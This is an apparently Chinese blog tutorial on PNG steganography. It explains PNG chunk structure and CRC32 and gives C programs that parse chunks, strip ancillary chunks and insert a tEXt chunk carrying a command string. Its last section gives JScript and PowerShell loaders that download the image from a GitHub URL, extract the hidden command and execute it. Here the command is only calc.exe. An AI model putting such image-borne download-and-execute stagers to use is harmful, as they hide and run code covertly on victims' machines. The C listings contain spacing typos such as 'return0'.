<html>
<head>
	
	<title>PNG在隐写中的应用</title>
	<meta name="keywords" content="fzb.me,冯宗宝,冯宗宝的blog" />

    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
	   <link href="/css/main.css?v=3" rel="stylesheet" type="text/css" />
    
        <script src="/js/util.js"></script>
        <script>
            if(isMobile()) {
                loadjscssfile('../css/mobile.css', 'css');
            } else {
                loadjscssfile('../css/desktop.css', 'css');
            }
        </script> 
    

    <link rel="alternate" type="application/atom+xml" href="/atom.xml" title="Atom feed">

    
	<link rel="shortcut icon" type="image/x-icon" href="/p1.png?v=3"/>
    

</head>

<body>


<h2 class="title">PNG在隐写中的应用</h2>
<!---
<div style="text-align:center;margin-top: -10px;">
<div class="article-category">
发表于2017年10月29日


    <a class="article-category-link" href="/categories/文件格式-数据隐藏/">文件格式 数据隐藏</a>



 </div>
--->
</div>

<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#00X0-前言"><span class="toc-text">00X0-前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-PNG文件格式"><span class="toc-text">0X01-PNG文件格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-实例图片分析"><span class="toc-text">0x02-实例图片分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-编写程序分析文件格式"><span class="toc-text">0x03-编写程序分析文件格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-去除多余数据"><span class="toc-text">0x04-去除多余数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-写入Payload"><span class="toc-text">0x05-写入Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-读取payload并执行"><span class="toc-text">0x06-读取payload并执行</span></a></li></ol>
<p>让我们一起来了解一下png图片的构成吧～知其然亦知其所以然</p>
<a id="more"></a>
<h2 id="00X0-前言"><a href="#00X0-前言" class="headerlink" title="00X0-前言"></a>00X0-前言</h2><p>其实是在研究隐写术的时候遇到了瓶颈，所以决定去系统的了解一下png的文件格式做一个总结，到这个阶段的隐写术不可能是单纯的三板斧解决的问题，以前为了做题总是将工具当作了主导，其实这样是不对的。工具只能起一部分的分析作用，自身的知识储备才是最重要的部分，否则始终都只是一个<code>script kid</code>。在这里向道哥致敬～</p>
<h2 id="0X01-PNG文件格式"><a href="#0X01-PNG文件格式" class="headerlink" title="0X01-PNG文件格式"></a>0X01-PNG文件格式</h2><p><strong>1、PNG文件署名域</strong></p>
<p>前8字节</p>
<p>固定格式，16进制为： 89 504e 47 0d 0a 1a 0a</p>
<p><strong>2、数据块</strong></p>
<p>Chunk Type Code(数据块类型码): 4字节,数据块类型码</p>
<p>Chunk Data(数据块数据): 可变长度,存储数据</p>
<p>CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码</p>
<p>数据块类型：</p>
<p><strong>1. 关键数据块(criticalchunk)</strong></p>
<p>(1) 文件头数据块IHDR(headerchunk) - 包含PNG文件的基本信息 - 一个PNG数据流中只能有一个IHDR - 必须在PNG文件最前面</p>
<p>(2) 调色板数据块PLTE(palettechunk) - 包含有与索引彩色图像(indexed-color image)相关的彩色变换数据 - 必须在IDAT之前</p>
<p>(3) 图像数据块IDAT(imagedata chunk) - 存储实际的数据 - 可存在多个 -必须与其他IDAT连续</p>
<p>(4) 图像结束数据IEND(imagetrailer chunk) - 固定格式，16进制为： 0000 00 00 49 45 4E 44 AE 42 60 82 - 必须在PNG文件最尾部</p>
<p><strong>2. 辅助数据块(ancillarychunk)</strong></p>
<p>用于辅助指示PNG图像中的层、文字等信息</p>
<p>可删除，不影响图片浏览，但图像将失去原来的可编辑性</p>
<p>(1) 背景颜色数据块bKGD(backgroundcolor)</p>
<p>(2) 基色和白色度数据块cHRM(primarychromaticities and white point)</p>
<p>(3) 图像γ数据块gAMA(image gamma)</p>
<p>(4) 图像直方图数据块hIST(imagehistogram)</p>
<p>(5) 物理像素尺寸数据块pHYs(physicalpixel dimensions)</p>
<p>(6) 样本有效位数据块sBIT(significantbits)</p>
<p>(7) 文本信息数据块tEXt(textualdata)</p>
<p>(8) 图像最后修改时间数据块tIME(image last-modification time)</p>
<p>(9) 图像透明数据块tRNS(transparency)</p>
<p>(10) 压缩文本数据块zTXt(compressed textual data)</p>
<h2 id="0x02-实例图片分析"><a href="#0x02-实例图片分析" class="headerlink" title="0x02-实例图片分析"></a>0x02-实例图片分析</h2><p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.36.18.png" alt=""></p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.37.29.png" alt=""></p>
<ol>
<li>png文件署名域</li>
</ol>
<pre><code class="c">//固定格式
89 50 4e 47 0d 0a 1a 0a
</code></pre>
<p>据块结构：</p>
<p>Length: 00 00 00 0D</p>
<p>前4字节，定义长度，00 00 000D十进制为13，代表长度为13个字节</p>
<p>Chunk Type Code： 4948 44 52</p>
<p>4字节，定义数据块类型码，此处为IHDR</p>
<p>Chunk Data： 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>共13字节，定义数据内容</p>
<p>CRC： 4字节，对Chunk Type Code+Chunk Data作CRC32计算得出的值</p>
<p>即对以下十六进制作计算： 49 48 44 52 00 00 03 20 00 00 02 90 08 02 00 00 00</p>
<p>我们可以编写程序对CRC算法进行一次验证；</p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include &lt;string.h&gt;
unsigned int GetCrc32(char* InStr,unsigned int len){        
 unsigned int  Crc32Table[256];     
 int i,j;        
 unsigned int Crc;        
 for(i = 0; i &lt; 256; i++){        
            Crc= i;        
            for(j = 0; j &lt; 8; j++){        
              if (Crc &amp; 1)        
                        Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
              else      
                        Crc&gt;&gt;= 1;      
            }        
            Crc32Table[i]= Crc;        
 }        
 Crc=0xffffffff;        
 for(int m=0; m&lt;len; m++){          
            Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
     }     
     Crc^= 0xFFFFFFFF;     
     return Crc;        
}       
int main(int argc, char* argv[])
{
            char buf[17]={0x49,0x48,0x44,0x52,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x1A,0x08,0x04,0x00,0x00,0x00};
            unsigned int crc32=GetCrc32(buf,sizeof(buf));
            printf(&quot;%08X\n&quot;,crc32);
            return 0;
}
</code></pre>
<p>运行程序之后发现算出来的CRC校验准确无误，那么从这里我们就可以想到就算是在，Unix/linux系统上修改了图片的宽高之后与CRC校验不符，也可以通过这种方a式来修改CRC校验，hhh，那么就不需要该死的windows了。</p>
<p><strong>(2) gAMA</strong></p>
<blockquote>
<p>00000021h: 00 00 00 04 67 41 4D 41 00 00 B18F 0B FC 61 05 </p>
<p>….gAMA..睆.黙.</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 04</p>
<p>Chunk Type Code： 6741 4D 41</p>
<p>Chunk Data： 00 00B1 8F</p>
<p>CRC： 0B FC 61 05</p>
<p><strong>(3) cHRM</strong></p>
<blockquote>
<p>00000031h: 00 00 00 20 63 48 52 4D 00 00 7A26 00 00 80 84 ; … cHRM..z&amp;..€? 00000041h: 00 00 FA 00 00 00 80 E8 00 00 7530 00 00 EA 60 </p>
<p>..?..€?.u0..阘 00000051h: 00 00 3A 9800 00 17 70 9C BA 51 3C ; ..:?..p満Q&lt;</p>
</blockquote>
<p>数据块结构：</p>
<p>Length: 00 00 00 20</p>
<p>Chunk Type Code： 6348 52 4D</p>
<p>Chunk Data： 00 007A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 9800 00 17 70</p>
<p>CRC： 9C BA 51 3C</p>
<p><strong>(4) IDAT</strong></p>
<p><strong>(5-14) tEXt</strong></p>
<p><strong>(15)IEND</strong></p>
<p>数据块结构：</p>
<p>Length: 00 00 00 00</p>
<p>Chunk Type Code： 4945 4E 44</p>
<p>Chunk Data：</p>
<p>CRC： AE 42 60 82</p>
<p>固定结构，CRC的值为对ChunkType Code作CRC32校验</p>
<h2 id="0x03-编写程序分析文件格式"><a href="#0x03-编写程序分析文件格式" class="headerlink" title="0x03-编写程序分析文件格式"></a>0x03-编写程序分析文件格式</h2><p>开发工具：vc6.0、dev-c++、codeblocks</p>
<ol>
<li>读取PNG文件</li>
</ol>
<p>保存为example2.cpp，代码如下:</p>
<pre><code class="c">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
int main(int argc, char* argv[])
{
            FILE *fp;   
            if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
                        return0;   
            fseek(fp,0,SEEK_END);
            int len=ftell(fp);
            unsignedchar *buf=new unsigned char[len];      
            fseek(fp,0,SEEK_SET);
            fread(buf,len,1,fp);
            printf(&quot;len=%d\n&quot;,len);
            for(int i=1;i&lt;=len;i++)
            {
                        printf(&quot;%02X&quot;,buf[i-1]);
                        if(i%16==0)
                                    printf(&quot;\n&quot;);
            }
            fclose(fp);
            printf(&quot;\n&quot;);
            return0;         
}
</code></pre>
<p>如图，程序按照UltraEdit的格式输出，以便后续的格式分析:</p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.56.48.png" alt=""></p>
<ol>
<li>解析数据块结构</li>
</ol>
<p>从第8字节开始，读前四字节为ChunkLength</p>
<p>对应的代码为：</p>
<pre><code class="C">unsigned intChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
</code></pre>
<p>接着四字节为ChunkName</p>
<pre><code class="C">printf(&quot;ChunkName:%c%c%c%c\n&quot;,buf[0],buf[1],buf[2],buf[3]);
</code></pre>
<p>然后根据ChunkLength读出完整的ChunkData</p>
<p>最后读出CRC32的值,同Chunk Type Code+Chunk Data求出的CRC32校验值作比较</p>
<p>保存为check.cpp,完整代码如下：</p>
<pre><code class="C">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
unsigned int GetCrc32(unsigned char*InStr,unsigned int len){        
            unsigned int Crc32Table[256];      
            unsigned int i,j;        
            unsigned int Crc;        
            for(i = 0; i &lt; 256; i++){        
                        Crc= i;        
                        for(j = 0; j &lt; 8; j++){        
                                    if(Crc &amp; 1)        
                                                Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
                                    else       
                                                Crc&gt;&gt;= 1;      
                        }        
                        Crc32Table[i]= Crc;        
            }        
            Crc=0xffffffff;        
            for(unsigned int m=0; m&lt;len; m++){          
                        Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
            }     
            Crc ^= 0xFFFFFFFF;     
            returnCrc;        
}       
int main(int argc, char* argv[])
{
            FILE*fp;   
            unsigned char *buf=NULL;
            unsigned int len=0;
            unsigned int ChunkLen=0;
            unsigned int ChunkCRC32=0;
            unsigned int ChunkOffset=0;         
            unsigned int crc32=0;
            unsigned int i=0;
            if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
                        return0;   
            fseek(fp,0,SEEK_END);
            len=ftell(fp);
            buf=newunsigned char[len];
            fseek(fp,0,SEEK_SET);
            fread(buf,len,1,fp);
            printf(&quot;TotalLen=%d\n&quot;,len);
            printf(&quot;----------------------------------------------------\n&quot;);
            fseek(fp,8,SEEK_SET);
            ChunkOffset=8;
            i=0;
            while(1)
            {
                        i++;
                        memset(buf,0,len);
                        fread(buf,4,1,fp);
                        ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
                        fread(buf,4+ChunkLen,1,fp);
                        printf(&quot;[+]ChunkName:%c%c%c%c                 &quot;,buf[0],buf[1],buf[2],buf[3]);
                        if(strncmp((char*)buf,&quot;IHDR&quot;,4)==0|strncmp((char*)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)
                                    printf(&quot;PaletteChunk\n&quot;);
                        printf(&quot;AncillaryChunk\n&quot;);
                        printf(&quot;   ChunkOffset:0x%08x       \n&quot;,ChunkOffset);
                        printf(&quot;   ChunkLen: %10d              \n&quot;,ChunkLen);
                        ChunkOffset+=ChunkLen+12;
                        crc32=GetCrc32(buf,ChunkLen+4);
                        printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
                        fread(buf,4,1,fp);
                        ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
                        printf(&quot;   ChunkCRC32: %08X                     &quot;,ChunkCRC32);
                        if(crc32!=ChunkCRC32)
                                    printf(&quot;[!]CRC32CheckError!\n&quot;);
                        else
                                    printf(&quot;CheckSuccess!\n\n&quot;);
                        ChunkLen=ftell(fp);
                        if(ChunkLen==(len-12))
                        {
                                    printf(&quot;\n----------------------------------------------------\n&quot;);
                                    printf(&quot;TotalChunk:%d\n&quot;,i);                        
                                    break;
                        }
            }
            fclose(fp);
            return0;         
}
</code></pre>
<p>运行如图，可获得完整的PNG文件结构:</p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-29%20%E4%B8%8B%E5%8D%882.58.01.png" alt=""></p>
<p>注：这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。</p>
<h2 id="0x04-去除多余数据"><a href="#0x04-去除多余数据" class="headerlink" title="0x04-去除多余数据"></a>0x04-去除多余数据</h2><p>上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Editor去除辅助数据块gAMA、cHRM和bKGD</p>
<p>文件大小变化，但不影响PNG文件浏览</p>
<ol>
<li>程序实现</li>
</ol>
<p>去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png</p>
<p>保存为compress.cpp,完整代码为：</p>
<pre><code class="C">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
unsigned int GetCrc32(unsignedchar*InStr,unsigned int len){        
           unsigned int Crc32Table[256];      
           unsigned int i,j;        
           unsigned int Crc;        
           for(i = 0; i &lt; 256; i++){        
                       Crc= i;        
                       for (j = 0;j &lt; 8; j++){        
                                   if(Crc &amp; 1)        
                                               Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
                                   else       
                                               Crc&gt;&gt;= 1;      
                       }        
                       Crc32Table[i]= Crc;        
           }        
           Crc=0xffffffff;        
           for(unsigned int m=0; m&lt;len; m++){         
                       Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^InStr[m]];        
           }     
           Crc^= 0xFFFFFFFF;     
           return Crc;        
}       
int main(int argc, char* argv[])
{
           FILE *fp,*fpnew;   
           unsigned char *buf=NULL;
           unsigned int len=0;
           unsigned int ChunkLen=0;
           unsigned int ChunkCRC32=0;
           unsigned int ChunkOffset=0;         
           unsigned int crc32=0;
           unsigned int i=0,j=0;
           unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};         
           unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};        
           if((fp=fopen(&quot;c:\\test\\0.png&quot;,&quot;rb+&quot;))==NULL)
                       return0;  
           if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)
                       return0;  
           fseek(fp,0,SEEK_END);
           len=ftell(fp);
           buf=newunsigned char[len];
           fseek(fp,0,SEEK_SET);
           fread(buf,len,1,fp);
           printf(&quot;TotalLen=%d\n&quot;,len);
           printf(&quot;----------------------------------------------------\n&quot;);
           fseek(fp,8,SEEK_SET);
           ChunkOffset=8;
           i=0;
           fwrite(Signature,8,1,fpnew);
           while(1)
           {
                       i++;
                       j=0;
                       memset(buf,0,len);
                       fread(buf,4,1,fp);
                      fwrite(buf,4,1,fpnew);
                       ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
                       fread(buf,4+ChunkLen,1,fp);
                       printf(&quot;[+]ChunkName:%c%c%c%c                &quot;,buf[0],buf[1],buf[2],buf[3]);
                       if(strncmp((char*)buf,&quot;IHDR&quot;,4)==0|strncmp((char*)buf,&quot;PLTE&quot;,4)==0|strncmp((char*)buf,&quot;IDAT&quot;,4)==0)
                       {           
                                   printf(&quot;PaletteChunk\n&quot;);
                                   fwrite(buf,4+ChunkLen,1,fpnew);
                       }
                       else
                       {
                                   printf(&quot;AncillaryChunk\n&quot;);
                                   fseek(fpnew,-4,SEEK_CUR);
                                   j=1;
                       }
                       printf(&quot;  ChunkOffset:0x%08x       \n&quot;,ChunkOffset);
                       printf(&quot;   ChunkLen:%10d             \n&quot;,ChunkLen);
                       crc32=GetCrc32(buf,ChunkLen+4);
                       printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
                       fread(buf,4,1,fp);
                       ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
                       printf(&quot;   ChunkCRC32:%08X                    &quot;,ChunkCRC32);
                       if(crc32!=ChunkCRC32)
                                   printf(&quot;[!]CRC32CheckError!\n&quot;);
                       else
                       {
                                   printf(&quot;CheckSuccess!\n\n&quot;);
                                   if(j==0)
                                               fwrite(buf,4,1,fpnew);
                       }
                       ChunkLen=ftell(fp);
                       if(ChunkLen==(len-12))
                       {
                                   printf(&quot;\n----------------------------------------------------\n&quot;);
                                   printf(&quot;TotalChunk:%d\n&quot;,i);                       
                                   break;
                       }
           }
           fwrite(IEND,12,1,fpnew);
           fclose(fp);
           fclose(fpnew);
           return0;         
}
</code></pre>
<h2 id="0x05-写入Payload"><a href="#0x05-写入Payload" class="headerlink" title="0x05-写入Payload"></a>0x05-写入Payload</h2><p>实例：按照辅助数据块的格式写入Payload</p>
<p>写入的Payload为:calc.exe</p>
<p>辅助数据块设置为：tEXt(文本信息数据块)</p>
<p>对应的完整数据块结构如下：</p>
<p>Length: 0000 00 08</p>
<p>Chunk Type Code： 74 45 58 74</p>
<p>Chunk Data：63 61 6c 63 2e 65 78 65</p>
<p>CRC：fa c4 08 76</p>
<p>写入的十六进制数据如下：</p>
<pre><code>00 00 00 08 74 45 58 74 63 61 6c 63 2e 6578 65 fa c4 08 76
</code></pre><p>注： 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Friend插入数据，如图</p>
<p>保存后，不影响PNG文件浏览</p>
<ol>
<li>程序实现</li>
</ol>
<p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>
<p>保存为addpayload.cpp,完整代码：</p>
<pre><code class="C">#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
unsigned int GetCrc32(unsigned char*InStr,unsigned int len){        
            unsigned int Crc32Table[256];      
            unsigned int i,j;        
            unsigned int Crc;        
            for(i = 0; i &lt; 256; i++){        
                        Crc= i;        
                        for(j = 0; j &lt; 8; j++){        
                                    if(Crc &amp; 1)        
                                                Crc= (Crc &gt;&gt; 1) ^ 0xEDB88320;        
                                    else       
                                                Crc&gt;&gt;= 1;      
                        }        
                        Crc32Table[i]= Crc;        
            }        
            Crc=0xffffffff;        
            for(unsigned int m=0; m&lt;len; m++){          
                        Crc= (Crc &gt;&gt; 8) ^ Crc32Table[(Crc &amp; 0xFF) ^ InStr[m]];        
            }
            Crc^= 0xFFFFFFFF;     
            returnCrc;        
}       
void convertStrToUnChar(char* str, unsigned char* UnChar)  
{  
            inti = strlen(str), j = 0, counter = 0;  
            charc[2];  
            unsignedint bytes[2];  
            for(j = 0; j &lt; i; j += 2)   
            {  
                        if(0== j % 2)  
                        {  
                                    c[0]= str[j];  
                                    c[1]= str[j + 1];  
                                    sscanf(c,&quot;%02x&quot; , &amp;bytes[0]);  
                                    UnChar[counter]= bytes[0];  
                                    counter++;  
                        }  
            }  
            return;  
}    
void AddPayload(FILE *fp)
{
            char*Payload=&quot;calc.exe&quot;;
            unsignedchar *buf;
            intlen;
            intcrc32;
            len=strlen(Payload); 
            buf=newunsigned char[len+12];
            buf[0]=len&gt;&gt;24&amp;0xff;
            buf[1]=len&gt;&gt;16&amp;0xff;
            buf[2]=len&gt;&gt;8&amp;0xff;
            buf[3]=len&amp;0xff;
            buf[4]=&#39;t&#39;;
            buf[5]=&#39;E&#39;;
            buf[6]=&#39;X&#39;;
            buf[7]=&#39;t&#39;;
            for(intj=0;j&lt;len;j++)
                        buf[j+8]=Payload[j];
            buf[len+8]=0XFA;
            buf[len+9]=0XC4;
            buf[len+10]=0X08;
            buf[len+11]=0X76;
            fwrite(buf,len+12,1,fp);
}
int main(int argc, char* argv[])
{
            FILE*fp,*fpnew;   
            unsigned char *buf=NULL;
            unsigned int len=0;
            unsigned int ChunkLen=0;
            unsigned int ChunkCRC32=0;
            unsigned int ChunkOffset=0;         
            unsigned int crc32=0;
            unsigned int i=0,j=0;
            unsigned char Signature[8]={0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a};          
            unsigned char IEND[12]={0x00,0x00,0x00,0x00,0x49,0x45,0x4e,0x44,0xae,0x42,0x60,0x82};         
            if((fp=fopen(&quot;c:\\test\\test.png&quot;,&quot;rb+&quot;))==NULL)
                        return0;  
            if((fpnew=fopen(&quot;c:\\test\\new.png&quot;,&quot;wb&quot;))==NULL)
                        return0;  
            fseek(fp,0,SEEK_END);
            len=ftell(fp);
            buf=newunsigned char[len];
            fseek(fp,0,SEEK_SET);
            fread(buf,len,1,fp);
            printf(&quot;TotalLen=%d\n&quot;,len);
            printf(&quot;----------------------------------------------------\n&quot;);
            fseek(fp,8,SEEK_SET);
            ChunkOffset=8;
            i=0;
            fwrite(Signature,8,1,fpnew);
            while(1)
            {
                        i++;
                        j=0;
                        memset(buf,0,len);
                        fread(buf,4,1,fp);
                        fwrite(buf,4,1,fpnew);
                        ChunkLen=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
                        fread(buf,4+ChunkLen,1,fp);
                        printf(&quot;[+]ChunkName:%c%c%c%c                 &quot;,buf[0],buf[1],buf[2],buf[3]);
                        if(strncmp((char*)buf,&quot;IHDR&quot;,4)==0|strncmp((char*)buf,&quot;PLTE&quot;,4)==0|strncmp((char *)buf,&quot;IDAT&quot;,4)==0)
                        {           
                                    printf(&quot;PaletteChunk\n&quot;);
                                    fwrite(buf,4+ChunkLen,1,fpnew);
                        }
                        else
                        {
                                    printf(&quot;AncillaryChunk\n&quot;);
                                    fseek(fpnew,-4,SEEK_CUR);
                                    j=1;
                        }
                        printf(&quot;   ChunkOffset:0x%08x       \n&quot;,ChunkOffset);
                        printf(&quot;   ChunkLen: %10d              \n&quot;,ChunkLen);
                        crc32=GetCrc32(buf,ChunkLen+4);
                        printf(&quot;   ExpectCRC32:%08X\n&quot;,crc32);
                        fread(buf,4,1,fp);
                        ChunkCRC32=(buf[0]&lt;&lt;24)|(buf[1]&lt;&lt;16)|(buf[2]&lt;&lt;8)|buf[3];
                        printf(&quot;   ChunkCRC32: %08X                     &quot;,ChunkCRC32);
                        if(crc32!=ChunkCRC32)
                                    printf(&quot;[!]CRC32CheckError!\n&quot;);
                        else
                        {
                                    printf(&quot;CheckSuccess!\n\n&quot;);
                                    if(j==0)
                                                fwrite(buf,4,1,fpnew);
                        }
                        ChunkLen=ftell(fp);
                        if(ChunkLen==(len-12))
                        {
                                    printf(&quot;\n----------------------------------------------------\n&quot;);
                                    printf(&quot;TotalChunk:%d\n&quot;,i);                        
                                    break;
                        }
            }
            AddPayload(fpnew);
            fwrite(IEND,12,1,fpnew);
            fclose(fp);
            fclose(fpnew);
            return0;         
}
</code></pre>
<p>使用check.cpp对其进行校验，如图，校验成功</p>
<h2 id="0x06-读取payload并执行"><a href="#0x06-读取payload并执行" class="headerlink" title="0x06-读取payload并执行"></a>0x06-读取payload并执行</h2><p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
<ol>
<li>javascript</li>
</ol>
<pre><code class="javascript">h = newActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
h.SetTimeouts(0, 0, 0, 0);
h.Open(&quot;GET&quot;,&quot;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png&quot;,false);
h.Send();
Data = h.ResponseText;
x=Data.indexOf(&quot;tEXt&quot;);
y=Data.indexOf(&quot;IEND&quot;);
str=Data.substring(x+4,y-8);
newActiveXObject(&quot;WScript.Shell&quot;).Run(str);
</code></pre>
<ol>
<li>powershell</li>
</ol>
<pre><code class="powershell">$url = &#39;https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png&#39;
$request = New-Object System.Net.WebCLient
$bytes = $request.DownloadString($url)
$x=$bytes.indexof(&quot;tEXt&quot;)
$y=$bytes.indexof(&quot;IEND&quot;)
$str=$bytes.Substring($x+4,$y-$x-12)
Start-Process -FilePath $str
</code></pre>
<p>注:这里给出两种方法，仅作演示</p>


<!--<a href="http://yoursite.com/2017/10/29/PNG在隐写中的应用/#disqus_thread" class="article-comment-link">Comments</a>
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'undefined'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-->
<div style="display:none">
<script src="http://s4.cnzz.com/stat.php?id=undefined&web_id=undefined" language="JavaScript"></script>script>
</div>






</body>
</html>